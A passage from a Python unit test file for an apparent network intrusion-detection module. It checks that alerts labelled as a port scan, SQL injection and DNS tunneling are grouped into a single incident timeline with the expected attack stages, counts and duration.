        alerts = [
            _alert("detect_tcp_syn_scan", timestamp=0, description="Scan"),
            _alert("detect_sql_injection", timestamp=10, dst_ip="10.0.0.3",
                   description="Exploit"),
            _alert("detect_dns_tunneling", timestamp=20, dst_ip="10.0.0.4",
                   description="Tunnel"),
        ]
        incidents = detections.build_incident_timelines(alerts)
        assert len(incidents) == 1
        assert "recon" in incidents[0]["stages_observed"]
        assert "exploit" in incidents[0]["stages_observed"]
        assert "c2" in incidents[0]["stages_observed"]

    def test_incident_contains_alert_details(self) -> None:
        alerts = [
            _alert("detect_tcp_syn_scan", timestamp=0, count=5),
            _alert("detect_sql_injection", timestamp=10, dst_ip="10.0.0.3",
                   count=2),
        ]
        incidents = detections.build_incident_timelines(alerts)
        assert len(incidents) == 1
        assert len(incidents[0]["alerts"]) == 2
        assert incidents[0]["total_alerts"] == 7
        assert incidents[0]["duration_sec"] == 10.0
